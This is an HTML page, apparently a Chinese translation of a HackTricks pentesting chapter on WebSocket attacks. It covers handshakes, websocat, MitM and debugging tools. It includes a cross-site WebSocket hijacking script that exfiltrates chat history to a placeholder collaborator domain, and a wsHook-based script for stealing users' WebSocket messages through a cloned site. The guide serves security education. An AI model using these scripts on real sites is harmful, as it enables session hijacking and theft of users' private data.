<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>WebSocket Attacks</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="websocket-攻击"><a class="header" href="#websocket-攻击">WebSocket 攻击</a></h1>
<p>{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持 HackTricks</summary>
<ul>
<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
</ul>
</details>
{% endhint %}
<h2 id="什么是-websockets"><a class="header" href="#什么是-websockets">什么是 WebSockets</a></h2>
<p>WebSocket 连接通过初始的 <strong>HTTP</strong> 握手建立，旨在实现 <strong>长时间</strong> 连接，允许随时进行双向消息传递，而无需事务系统。这使得 WebSockets 特别适合需要 <strong>低延迟或服务器发起通信</strong> 的应用程序，例如实时金融数据流。</p>
<h3 id="websocket-连接的建立"><a class="header" href="#websocket-连接的建立">WebSocket 连接的建立</a></h3>
<p>有关建立 WebSocket 连接的详细说明可以访问 <a href="https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc"><strong>这里</strong></a>。总之，WebSocket 连接通常通过客户端 JavaScript 发起，如下所示：</p>
<pre><code class="language-javascript">var ws = new WebSocket("wss://normal-website.com/ws");
</code></pre>
<p><code>wss</code> 协议表示一个通过 <strong>TLS</strong> 安全的 WebSocket 连接，而 <code>ws</code> 表示一个 <strong>不安全</strong> 的连接。</p>
<p>在连接建立期间，浏览器和服务器之间通过 HTTP 进行握手。握手过程涉及浏览器发送请求和服务器响应，如下例所示：</p>
<p>浏览器发送握手请求：</p>
<pre><code class="language-javascript">GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
</code></pre>
<p>服务器的握手响应：</p>
<pre><code class="language-javascript">HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
</code></pre>
<p>一旦建立，连接将保持开放以便双向消息交换。</p>
<p><strong>WebSocket 握手的关键点：</strong></p>
<ul>
<li><code>Connection</code> 和 <code>Upgrade</code> 头部信号表示 WebSocket 握手的开始。</li>
<li><code>Sec-WebSocket-Version</code> 头部指示所需的 WebSocket 协议版本，通常为 <code>13</code>。</li>
<li>在 <code>Sec-WebSocket-Key</code> 头部中发送一个 Base64 编码的随机值，确保每个握手都是唯一的，这有助于防止缓存代理出现问题。这个值不是用于身份验证，而是确认响应不是由配置错误的服务器或缓存生成的。</li>
<li>服务器响应中的 <code>Sec-WebSocket-Accept</code> 头部是 <code>Sec-WebSocket-Key</code> 的哈希，验证服务器打开 WebSocket 连接的意图。</li>
</ul>
<p>这些特性确保握手过程安全可靠，为高效的实时通信铺平道路。</p>
<h3 id="linux-控制台"><a class="header" href="#linux-控制台">Linux 控制台</a></h3>
<p>您可以使用 <code>websocat</code> 与 websocket 建立原始连接。</p>
<pre><code class="language-bash">websocat --insecure wss://10.10.10.10:8000 -v
</code></pre>
<p>或者创建一个 websocat 服务器：</p>
<pre><code class="language-bash">websocat -s 0.0.0.0:8000 #Listen in port 8000
</code></pre>
<h3 id="mitm-websocket-连接"><a class="header" href="#mitm-websocket-连接">MitM websocket 连接</a></h3>
<p>如果你发现客户端从当前本地网络连接到一个 <strong>HTTP websocket</strong>，你可以尝试进行一个 <a href="../generic-methodologies-and-resources/pentesting-network/#arp-spoofing">ARP Spoofing Attack </a>来在客户端和服务器之间执行 MitM 攻击。<br />
一旦客户端尝试连接，你可以使用：</p>
<pre><code class="language-bash">websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
</code></pre>
<h3 id="websockets-enumeration"><a class="header" href="#websockets-enumeration">Websockets enumeration</a></h3>
<p>您可以使用 <strong>工具</strong> <a href="https://github.com/PalindromeLabs/STEWS"><strong>https://github.com/PalindromeLabs/STEWS</strong></a> <strong>自动发现、指纹识别和搜索已知的</strong> <strong>漏洞</strong> <strong>在 websockets 中。</strong></p>
<h3 id="websocket-debug-tools"><a class="header" href="#websocket-debug-tools">Websocket Debug tools</a></h3>
<ul>
<li><strong>Burp Suite</strong> 以与常规 HTTP 通信非常相似的方式支持 MitM websockets 通信。</li>
<li><a href="https://github.com/snyk/socketsleuth"><strong>socketsleuth</strong></a> <strong>Burp Suite 扩展</strong> 将允许您通过获取 <strong>历史记录</strong>、设置 <strong>拦截规则</strong>、使用 <strong>匹配和替换</strong> 规则、使用 <strong>Intruder</strong> 和 <strong>AutoRepeater</strong> 更好地管理 Burp 中的 Websocket 通信。</li>
<li><a href="https://github.com/nccgroup/wssip"><strong>WSSiP</strong></a><strong>:</strong> 代表 "<strong>WebSocket/Socket.io Proxy</strong>"，这个用 Node.js 编写的工具提供了一个用户界面来 <strong>捕获、拦截、发送自定义</strong> 消息并查看客户端和服务器之间的所有 WebSocket 和 Socket.IO 通信。</li>
<li><a href="https://github.com/doyensec/wsrepl"><strong>wsrepl</strong></a> 是一个 <strong>交互式 websocket REPL</strong>，专门为渗透测试设计。它提供了一个接口来观察 <strong>传入的 websocket 消息并发送新的消息</strong>，并提供一个易于使用的框架来 <strong>自动化</strong> 这种通信。 </li>
<li><a href="https://websocketking.com/"><strong>https://websocketking.com/</strong></a> 是一个 <strong>用于与其他网站通信</strong> 的 <strong>web</strong>，使用 <strong>websockets</strong>。</li>
<li><a href="https://hoppscotch.io/realtime/websocket"><strong>https://hoppscotch.io/realtime/websocket</strong></a> 在其他类型的通信/协议中，它提供了一个 <strong>用于与其他网站通信</strong> 的 <strong>web</strong>，使用 <strong>websockets</strong>。</li>
</ul>
<h2 id="websocket-lab"><a class="header" href="#websocket-lab">Websocket Lab</a></h2>
<p>在 <a href="https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course"><strong>Burp-Suite-Extender-Montoya-Course</strong></a> 中，您有一个代码来启动一个使用 websockets 的 web，在 <a href="https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/"><strong>这篇文章</strong></a> 中您可以找到解释。</p>
<h2 id="cross-site-websocket-hijacking-cswsh"><a class="header" href="#cross-site-websocket-hijacking-cswsh">Cross-site WebSocket hijacking (CSWSH)</a></h2>
<p><strong>跨站点 WebSocket 劫持</strong>，也称为 <strong>跨源 WebSocket 劫持</strong>，被识别为影响 WebSocket 握手的 <strong><a href="csrf-cross-site-request-forgery.html">跨站请求伪造 (CSRF)</a></strong> 的特定案例。此漏洞发生在 WebSocket 握手仅通过 <strong>HTTP cookies</strong> 进行身份验证，而没有 <strong>CSRF tokens</strong> 或类似的安全措施。</p>
<p>攻击者可以通过托管一个 <strong>恶意网页</strong> 来利用这一点，该网页发起对易受攻击应用程序的跨站点 WebSocket 连接。因此，这个连接被视为受害者与应用程序的会话的一部分，利用会话处理机制中缺乏 CSRF 保护。</p>
<h3 id="simple-attack"><a class="header" href="#simple-attack">Simple Attack</a></h3>
<p>请注意，当 <strong>建立</strong> 一个 <strong>websocket</strong> 连接时，<strong>cookie</strong> 会被 <strong>发送</strong> 到服务器。<strong>服务器</strong> 可能会使用它来 <strong>关联</strong> 每个 <strong>特定</strong> <strong>用户</strong> 与其 <strong>基于发送的 cookie 的 websocket</strong> <strong>会话</strong>。</p>
<p>然后，如果 <strong>例如</strong> <strong>websocket</strong> <strong>服务器</strong> <strong>发送回用户的对话历史</strong>，如果发送了一个消息 "<strong>READY"</strong>，那么一个 <strong>简单的 XSS</strong> 建立连接（<strong>cookie</strong> 将 <strong>自动发送</strong> 以授权受害者用户） <strong>发送</strong> "<strong>READY</strong>" 将能够 <strong>检索</strong> <strong>对话</strong> 的历史记录。</p>
<pre><code class="language-markup">&lt;script&gt;
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
&lt;/script&gt;
</code></pre>
<h3 id="跨源--不同子域的-cookie"><a class="header" href="#跨源--不同子域的-cookie">跨源 + 不同子域的 Cookie</a></h3>
<p>在这篇博客文章 <a href="https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/">https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/</a> 中，攻击者成功地 <strong>在发生 Websocket 通信的域的子域中执行任意 Javascript</strong>。因为这是一个 <strong>子域</strong>，<strong>cookie</strong> 被 <strong>发送</strong>，而且 <strong>Websocket 没有正确检查 Origin</strong>，因此可以与其通信并 <strong>窃取其中的令牌</strong>。</p>
<h3 id="从用户那里窃取数据"><a class="header" href="#从用户那里窃取数据">从用户那里窃取数据</a></h3>
<p>复制您想要模仿的 Web 应用程序（例如 .html 文件），并在发生 Websocket 通信的脚本中添加以下代码：</p>
<pre><code class="language-javascript">//This is the script tag to load the websocket hooker
&lt;script src='wsHook.js'&gt;&lt;/script&gt;

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some &lt;script&gt; tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
</code></pre>
<p>现在从 <a href="https://github.com/skepticfx/wshook">https://github.com/skepticfx/wshook</a> 下载 <code>wsHook.js</code> 文件，并<strong>将其保存在网页文件夹内</strong>。<br />
通过暴露网络应用程序并使用户连接到它，您将能够窃取通过 websocket 发送和接收的消息：</p>
<pre><code class="language-javascript">sudo python3 -m http.server 80
</code></pre>
<h2 id="竞争条件"><a class="header" href="#竞争条件">竞争条件</a></h2>
<p>WebSockets中的竞争条件也是一个问题，<a href="race-condition.html#rc-in-websockets">查看此信息以了解更多</a>。</p>
<h2 id="其他漏洞"><a class="header" href="#其他漏洞">其他漏洞</a></h2>
<p>由于Web Sockets是一种<strong>向服务器端和客户端发送数据的机制</strong>，因此根据服务器和客户端如何处理信息，<strong>Web Sockets可以被用来利用其他几种漏洞，如XSS、SQLi或任何其他常见的网络漏洞，使用来自websocket的用户输入。</strong></p>
<h2 id="websocket走私"><a class="header" href="#websocket走私"><strong>WebSocket走私</strong></a></h2>
<p>此漏洞可能允许您<strong>绕过反向代理限制</strong>，使其相信<strong>已建立了websocket通信</strong>（即使这不是真的）。这可能允许攻击者<strong>访问隐藏的端点</strong>。有关更多信息，请查看以下页面：</p>
<p>{% content-ref url="h2c-smuggling.md" %}
<a href="h2c-smuggling.html">h2c-smuggling.md</a>
{% endcontent-ref %}</p>
<h2 id="参考文献"><a class="header" href="#参考文献">参考文献</a></h2>
<ul>
<li><a href="https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages">https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages</a></li>
</ul>
<p>{% hint style="success" %}
学习和实践AWS黑客攻击：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks培训AWS红队专家（ARTE）</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
学习和实践GCP黑客攻击：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks培训GCP红队专家（GRTE）</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>支持HackTricks</summary>
<ul>
<li>查看<a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord群组</strong></a>或<a href="https://t.me/peass"><strong>电报群组</strong></a>或<strong>在Twitter上关注</strong>我们🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a>和<a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github库提交PR来分享黑客技巧。</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../pentesting-web/uuid-insecurities.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../pentesting-web/web-tool-wfuzz.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../pentesting-web/uuid-insecurities.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../pentesting-web/web-tool-wfuzz.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
